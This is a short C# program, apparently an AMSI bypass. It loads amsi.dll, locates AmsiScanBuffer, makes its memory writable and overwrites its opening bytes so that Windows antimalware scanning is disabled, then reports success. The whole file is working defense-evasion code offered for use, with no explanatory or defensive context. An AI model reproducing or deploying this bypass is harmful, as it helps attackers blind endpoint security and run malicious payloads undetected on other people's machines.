using System;
using System.Runtime.InteropServices;

public class AMSIBypass
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        var hModule = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(hModule, "AmsiScanBuffer");
        VirtualProtect(addr, (UIntPtr)5, 0x40, out var oldProtect);
        Marshal.Copy(new byte[] { 0x31, 0xFF, 0x90 }, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)5, oldProtect, out _);
    }

    public static void Main(string[] args)
    {
        Bypass();
        Console.WriteLine("AMSI Bypass Applied");
    }
}
